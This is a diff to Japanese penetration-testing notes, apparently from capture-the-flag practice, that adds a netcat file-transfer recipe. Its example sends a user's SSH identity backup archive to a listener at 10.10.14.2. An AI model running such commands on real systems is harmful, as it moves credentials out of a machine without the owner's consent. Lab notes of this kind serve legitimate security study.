@@ -912,6 +912,21 @@ pip install .
 
 # その他
 
+- nc でファイル転送したい
+
+[リンク]（https://eel3.hatenablog.com/entry/20160422/1461336229）
+
+```
+
+ex:
+
+nc -lvnp 1337 > backup_ssh.tgz
+
+nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
+
+```
+
+
 - Windows で user.txt を探したい
 
 ```
